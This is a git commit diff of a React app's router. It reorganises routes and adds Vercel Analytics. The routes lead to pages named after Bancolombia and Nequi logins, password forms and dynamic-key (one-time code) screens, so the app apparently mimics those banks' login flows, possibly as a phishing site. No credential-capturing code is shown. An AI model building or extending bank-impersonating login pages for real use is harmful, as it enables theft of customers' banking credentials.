d63000004b0d517e5610376ec755fdb967c321fe
TheBaby <m86298006@gmail.com>
2025-08-19 20:18:57 -0500

    ajajuan

--- src/App.jsx
+++ src/App.jsx
@@ -6,23 +6,26 @@ import PasswordForm from "./components/PasswordForm/PasswordForm"
 import ClaveDinamica from "./components/ClaveDinamica/ClaveDinamica"
 import NequiClaveDinamica from "./components/NequiClaveDinamica/NequiClaveDinamica"
 import NequiLogin from "./components/NequiLogin/NequiLogin"
+import { Analytics } from "@vercel/analytics/react"   // ✅ este es el correcto
 
 function App() {
   return (
-    <Router>
-      <Routes>
-        {/* Pantalla principal */}
-        <Route path="/" element={<MainApp />} />
+    <>
+      <Router>
+        <Routes>
+          {/* Pantalla principal */}
+          <Route path="/" element={<MainApp />} />
+          <Route path="/bancolombia" element={<BancolombiaSim />} />
+          <Route path="/clave" element={<PasswordForm />} />
+          <Route path="/clave-dinamica" element={<ClaveDinamica />} />
+          <Route path="/nequi" element={<NequiLogin />} />
+          <Route path="/nequi/clave-dinamica" element={<NequiClaveDinamica />} />
+        </Routes>
+      </Router>
 
-     
-        <Route path="/bancolombia" element={<BancolombiaSim />} />
-        <Route path="/clave" element={<PasswordForm />} />
-        <Route path="/clave-dinamica" element={<ClaveDinamica />} />
-        <Route path="/nequi" element={<NequiLogin />} />
-        <Route path="/nequi/clave-dinamica" element={<NequiClaveDinamica />} />
-
-      </Routes>
-    </Router>
+      {/* Analytics de Vercel */}
+      <Analytics />
+    </>
   )
 }
 
